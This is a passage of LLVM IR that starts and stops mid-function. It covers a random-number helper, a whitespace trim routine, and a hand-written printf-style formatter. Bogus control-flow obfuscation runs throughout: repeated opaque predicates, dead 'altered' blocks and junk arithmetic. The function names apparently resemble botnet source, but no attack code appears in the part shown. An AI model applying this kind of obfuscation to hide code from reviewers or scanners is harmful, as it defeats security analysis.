  %39 = add i32 %38, 1
  store i32 %39, i32* %3, align 4
  %40 = load i32, i32* @c, align 4
  %41 = add i32 %40, 1
  store i32 %41, i32* @c, align 4
  %42 = load i32, i32* @x.1
  %43 = load i32, i32* @y.2
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %50

; <label>:50:                                     ; preds = %originalBBpart2, %0
  %51 = load i32, i32* %4, align 4
  %52 = load i32, i32* %3, align 4
  %53 = sub i32 %51, %52
  %54 = load i32, i32* @rand_cmwc.i, align 4
  %55 = zext i32 %54 to i64
  %56 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %55
  store i32 %53, i32* %56, align 4
  ret i32 %53

originalBBalteredBB:                              ; preds = %originalBB, %29
  %57 = load i32, i32* %3, align 4
  %_ = shl i32 %57, 1
  %_1 = sub i32 %57, 1
  %gen = mul i32 %_1, 1
  %_2 = sub i32 %57, 1
  %gen3 = mul i32 %_2, 1
  %_4 = sub i32 %57, 1
  %gen5 = mul i32 %_4, 1
  %_6 = shl i32 %57, 1
  %_7 = shl i32 %57, 1
  %58 = add i32 %57, 1
  store i32 %58, i32* %3, align 4
  %59 = load i32, i32* @c, align 4
  %_8 = shl i32 %59, 1
  %_9 = sub i32 0, %59
  %gen10 = add i32 %_9, 1
  %_11 = sub i32 %59, 1
  %gen12 = mul i32 %_11, 1
  %60 = add i32 %59, 1
  store i32 %60, i32* @c, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #10
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

; <label>:59:                                     ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43

; <label>:62:                                     ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %651, %3
  %13 = load i32, i32* @x.7
  %14 = load i32, i32* @y.8
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load i8*, i8** %5, align 8
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  %25 = load i32, i32* @x.7
  %26 = load i32, i32* @y.8
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %654

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  br i1 %37, label %38, label %610

; <label>:38:                                     ; preds = %33
  %39 = load i8*, i8** %5, align 8
  %40 = getelementptr inbounds i8, i8* %39, i32 1
  store i8* %40, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %45, label %62

; <label>:45:                                     ; preds = %38
  %46 = load i32, i32* @x.7
  %47 = load i32, i32* @y.8
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %45
  %54 = load i32, i32* @x.7
  %55 = load i32, i32* @y.8
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %654

; <label>:62:                                     ; preds = %38
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 37
  br i1 %66, label %67, label %68

; <label>:67:                                     ; preds = %62
  br label %611

; <label>:68:                                     ; preds = %62
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp eq i32 %71, 45
  br i1 %72, label %73, label %92

; <label>:73:                                     ; preds = %68
  %74 = load i32, i32* @x.7
  %75 = load i32, i32* @y.8
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i8*, i8** %5, align 8
  %83 = getelementptr inbounds i8, i8* %82, i32 1
  store i8* %83, i8** %5, align 8
  store i32 1, i32* %8, align 4
  %84 = load i32, i32* @x.7
  %85 = load i32, i32* @y.8
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %92

; <label>:92:                                     ; preds = %originalBBpart28, %68
  %93 = load i32, i32* @x.7
  %94 = load i32, i32* @y.8
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %92
  %101 = load i32, i32* @x.7
  %102 = load i32, i32* @y.8
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %109

; <label>:109:                                    ; preds = %114, %originalBBpart212
  %110 = load i8*, i8** %5, align 8
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 48
  br i1 %113, label %114, label %119

; <label>:114:                                    ; preds = %109
  %115 = load i8*, i8** %5, align 8
  %116 = getelementptr inbounds i8, i8* %115, i32 1
  store i8* %116, i8** %5, align 8
  %117 = load i32, i32* %8, align 4
  %118 = or i32 %117, 2
  store i32 %118, i32* %8, align 4
  br label %109

; <label>:119:                                    ; preds = %109
  %120 = load i32, i32* @x.7
  %121 = load i32, i32* @y.8
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %119
  %128 = load i32, i32* @x.7
  %129 = load i32, i32* @y.8
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %136

; <label>:136:                                    ; preds = %originalBBpart259, %originalBBpart216
  %137 = load i32, i32* @x.7
  %138 = load i32, i32* @y.8
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %136
  %145 = load i8*, i8** %5, align 8
  %146 = load i8, i8* %145, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp sge i32 %147, 48
  %149 = load i32, i32* @x.7
  %150 = load i32, i32* @y.8
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %148, label %157, label %162

; <label>:157:                                    ; preds = %originalBBpart220
  %158 = load i8*, i8** %5, align 8
  %159 = load i8, i8* %158, align 1
  %160 = zext i8 %159 to i32
  %161 = icmp sle i32 %160, 57
  br label %162

; <label>:162:                                    ; preds = %157, %originalBBpart220
  %163 = phi i1 [ false, %originalBBpart220 ], [ %161, %157 ]
  %164 = load i32, i32* @x.7
  %165 = load i32, i32* @y.8
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %162
  %172 = load i32, i32* @x.7
  %173 = load i32, i32* @y.8
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %163, label %180, label %224

; <label>:180:                                    ; preds = %originalBBpart224
  %181 = load i32, i32* @x.7
  %182 = load i32, i32* @y.8
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %180
  %189 = load i32, i32* %7, align 4
  %190 = mul nsw i32 %189, 10
  store i32 %190, i32* %7, align 4
  %191 = load i8*, i8** %5, align 8
  %192 = load i8, i8* %191, align 1
  %193 = zext i8 %192 to i32
  %194 = sub nsw i32 %193, 48
  %195 = load i32, i32* %7, align 4
  %196 = add nsw i32 %195, %194
  store i32 %196, i32* %7, align 4
  %197 = load i32, i32* @x.7
  %198 = load i32, i32* @y.8
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBBpart255, label %originalBB26alteredBB

originalBBpart255:                                ; preds = %originalBB26
  br label %205

; <label>:205:                                    ; preds = %originalBBpart255
  %206 = load i32, i32* @x.7
  %207 = load i32, i32* @y.8
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %205
  %214 = load i8*, i8** %5, align 8
  %215 = getelementptr inbounds i8, i8* %214, i32 1
  store i8* %215, i8** %5, align 8
  %216 = load i32, i32* @x.7
  %217 = load i32, i32* @y.8
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br label %136

; <label>:224:                                    ; preds = %originalBBpart224
  %225 = load i32, i32* @x.7
  %226 = load i32, i32* @y.8
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %224
  %233 = load i8*, i8** %5, align 8
  %234 = load i8, i8* %233, align 1
  %235 = zext i8 %234 to i32
  %236 = icmp eq i32 %235, 115
  %237 = load i32, i32* @x.7
  %238 = load i32, i32* @y.8
  %239 = sub i32 %237, 1
  %240 = mul i32 %237, %239
  %241 = urem i32 %240, 2
  %242 = icmp eq i32 %241, 0
  %243 = icmp slt i32 %238, 10
  %244 = or i1 %242, %243
  br i1 %244, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br i1 %236, label %245, label %327

; <label>:245:                                    ; preds = %originalBBpart263
  %246 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %247 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %246, i32 0, i32 0
  %248 = load i32, i32* %247, align 8
  %249 = icmp ule i32 %248, 40
  br i1 %249, label %250, label %256

; <label>:250:                                    ; preds = %245
  %251 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %246, i32 0, i32 3
  %252 = load i8*, i8** %251, align 8
  %253 = getelementptr i8, i8* %252, i32 %248
  %254 = bitcast i8* %253 to i32*
  %255 = add i32 %248, 8
  store i32 %255, i32* %247, align 8
  br label %277

; <label>:256:                                    ; preds = %245
  %257 = load i32, i32* @x.7
  %258 = load i32, i32* @y.8
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %256
  %265 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %246, i32 0, i32 2
  %266 = load i8*, i8** %265, align 8
  %267 = bitcast i8* %266 to i32*
  %268 = getelementptr i8, i8* %266, i32 8
  store i8* %268, i8** %265, align 8
  %269 = load i32, i32* @x.7
  %270 = load i32, i32* @y.8
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br label %277

; <label>:277:                                    ; preds = %originalBBpart267, %250
  %278 = phi i32* [ %254, %250 ], [ %267, %originalBBpart267 ]
  %279 = load i32, i32* @x.7
  %280 = load i32, i32* @y.8
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %277
  %287 = load i32, i32* %278, align 4
  %288 = sext i32 %287 to i64
  %289 = inttoptr i64 %288 to i8*
  store i8* %289, i8** %11, align 8
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %11, align 8
  %292 = icmp ne i8* %291, null
  %293 = load i32, i32* @x.7
  %294 = load i32, i32* @y.8
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br i1 %292, label %301, label %303

; <label>:301:                                    ; preds = %originalBBpart271
  %302 = load i8*, i8** %11, align 8
  br label %304

; <label>:303:                                    ; preds = %originalBBpart271
  br label %304

; <label>:304:                                    ; preds = %303, %301
  %305 = phi i8* [ %302, %301 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.112, i32 0, i32 0), %303 ]
  %306 = load i32, i32* @x.7
  %307 = load i32, i32* @y.8
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %304
  %314 = load i32, i32* %7, align 4
  %315 = load i32, i32* %8, align 4
  %316 = call i32 @prints(i8** %290, i8* %305, i32 %314, i32 %315)
  %317 = load i32, i32* %9, align 4
  %318 = add nsw i32 %317, %316
  store i32 %318, i32* %9, align 4
  %319 = load i32, i32* @x.7
  %320 = load i32, i32* @y.8
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBBpart277, label %originalBB73alteredBB

originalBBpart277:                                ; preds = %originalBB73
  br label %651

; <label>:327:                                    ; preds = %originalBBpart263
  %328 = load i8*, i8** %5, align 8
  %329 = load i8, i8* %328, align 1
  %330 = zext i8 %329 to i32
  %331 = icmp eq i32 %330, 100
  br i1 %331, label %332, label %389

; <label>:332:                                    ; preds = %327
  %333 = load i32, i32* @x.7
  %334 = load i32, i32* @y.8
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %332
  %341 = load i8**, i8*** %4, align 8
  %342 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %343 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %342, i32 0, i32 0
  %344 = load i32, i32* %343, align 8
  %345 = icmp ule i32 %344, 40
  %346 = load i32, i32* @x.7
  %347 = load i32, i32* @y.8
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br i1 %345, label %354, label %360

; <label>:354:                                    ; preds = %originalBBpart281
  %355 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %342, i32 0, i32 3
  %356 = load i8*, i8** %355, align 8
  %357 = getelementptr i8, i8* %356, i32 %344
  %358 = bitcast i8* %357 to i32*
  %359 = add i32 %344, 8
  store i32 %359, i32* %343, align 8
  br label %381

; <label>:360:                                    ; preds = %originalBBpart281
  %361 = load i32, i32* @x.7
  %362 = load i32, i32* @y.8
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %360
  %369 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %342, i32 0, i32 2
  %370 = load i8*, i8** %369, align 8
  %371 = bitcast i8* %370 to i32*
  %372 = getelementptr i8, i8* %370, i32 8
  store i8* %372, i8** %369, align 8
  %373 = load i32, i32* @x.7
  %374 = load i32, i32* @y.8
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br label %381

; <label>:381:                                    ; preds = %originalBBpart285, %354
  %382 = phi i32* [ %358, %354 ], [ %371, %originalBBpart285 ]
  %383 = load i32, i32* %382, align 4
  %384 = load i32, i32* %7, align 4
  %385 = load i32, i32* %8, align 4
  %386 = call i32 @printi(i8** %341, i32 %383, i32 10, i32 1, i32 %384, i32 %385, i32 97)
  %387 = load i32, i32* %9, align 4
  %388 = add nsw i32 %387, %386
  store i32 %388, i32* %9, align 4
  br label %651

; <label>:389:                                    ; preds = %327
  %390 = load i8*, i8** %5, align 8
  %391 = load i8, i8* %390, align 1
  %392 = zext i8 %391 to i32
  %393 = icmp eq i32 %392, 120
  br i1 %393, label %394, label %451

; <label>:394:                                    ; preds = %389
  %395 = load i8**, i8*** %4, align 8
  %396 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %397 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %396, i32 0, i32 0
  %398 = load i32, i32* %397, align 8
  %399 = icmp ule i32 %398, 40
  br i1 %399, label %400, label %422

; <label>:400:                                    ; preds = %394
  %401 = load i32, i32* @x.7
  %402 = load i32, i32* @y.8
  %403 = sub i32 %401, 1
  %404 = mul i32 %401, %403
  %405 = urem i32 %404, 2
  %406 = icmp eq i32 %405, 0
  %407 = icmp slt i32 %402, 10
  %408 = or i1 %406, %407
  br i1 %408, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %400
  %409 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %396, i32 0, i32 3
  %410 = load i8*, i8** %409, align 8
  %411 = getelementptr i8, i8* %410, i32 %398
  %412 = bitcast i8* %411 to i32*
  %413 = add i32 %398, 8
  store i32 %413, i32* %397, align 8
  %414 = load i32, i32* @x.7
  %415 = load i32, i32* @y.8
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBBpart293, label %originalBB87alteredBB

originalBBpart293:                                ; preds = %originalBB87
  br label %443

; <label>:422:                                    ; preds = %394
  %423 = load i32, i32* @x.7
  %424 = load i32, i32* @y.8
  %425 = sub i32 %423, 1
  %426 = mul i32 %423, %425
  %427 = urem i32 %426, 2
  %428 = icmp eq i32 %427, 0
  %429 = icmp slt i32 %424, 10
  %430 = or i1 %428, %429
  br i1 %430, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %422
  %431 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %396, i32 0, i32 2
  %432 = load i8*, i8** %431, align 8
  %433 = bitcast i8* %432 to i32*
  %434 = getelementptr i8, i8* %432, i32 8
  store i8* %434, i8** %431, align 8
  %435 = load i32, i32* @x.7
  %436 = load i32, i32* @y.8
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br label %443

; <label>:443:                                    ; preds = %originalBBpart297, %originalBBpart293
  %444 = phi i32* [ %412, %originalBBpart293 ], [ %433, %originalBBpart297 ]
  %445 = load i32, i32* %444, align 4
  %446 = load i32, i32* %7, align 4
  %447 = load i32, i32* %8, align 4
  %448 = call i32 @printi(i8** %395, i32 %445, i32 16, i32 0, i32 %446, i32 %447, i32 97)
  %449 = load i32, i32* %9, align 4
  %450 = add nsw i32 %449, %448
  store i32 %450, i32* %9, align 4
  br label %651

; <label>:451:                                    ; preds = %389
  %452 = load i32, i32* @x.7
  %453 = load i32, i32* @y.8
  %454 = sub i32 %452, 1
  %455 = mul i32 %452, %454
  %456 = urem i32 %455, 2
  %457 = icmp eq i32 %456, 0
  %458 = icmp slt i32 %453, 10
  %459 = or i1 %457, %458
  br i1 %459, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %451
  %460 = load i8*, i8** %5, align 8
  %461 = load i8, i8* %460, align 1
  %462 = zext i8 %461 to i32
  %463 = icmp eq i32 %462, 88
  %464 = load i32, i32* @x.7
  %465 = load i32, i32* @y.8
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br i1 %463, label %472, label %497

; <label>:472:                                    ; preds = %originalBBpart2101
  %473 = load i8**, i8*** %4, align 8
  %474 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %475 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %474, i32 0, i32 0
  %476 = load i32, i32* %475, align 8
  %477 = icmp ule i32 %476, 40
  br i1 %477, label %478, label %484

